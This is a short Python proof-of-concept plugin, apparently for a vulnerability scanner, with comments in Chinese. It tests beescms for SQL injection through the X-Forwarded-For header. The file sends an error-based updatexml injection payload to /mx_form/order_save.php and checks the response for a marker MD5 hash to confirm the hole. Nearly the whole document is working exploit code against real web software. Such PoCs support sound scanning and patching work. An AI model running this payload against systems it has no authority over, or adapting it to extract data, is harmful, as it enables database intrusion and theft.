# Author:w8ay
# Name:beescms XFF注入漏洞
import HackRequests

def poc(arg, **kwargs):
    headers = '''
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
X-Forwarded-For: 1.1.1.1' or updatexml(1,concat(0x7e,md5(123),0x7e),1) or '
    '''
    data = "feed_code=a&_SESSION[code]=a&form_id=5&fields[aaa][nnn]=1111"
    vulnurl = arg + "/mx_form/order_save.php"
    hh = HackRequests.http(url = vulnurl,post = data,headers = headers)
    if hh.status_code == 200 and "202cb962ac59075b964b07152d234b70" in hh.text():
        result = {
            "name": "beescms XFF注入漏洞",  # 插件名称
            "content": "X-FORWARDED-FOR注入漏洞，在这里添加注入语句会造成注入",  # 插件返回内容详情，会造成什么后果。
            "url": vulnurl,  # 漏洞存在url
            "log": hh.log,
            "tag": "sqli"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass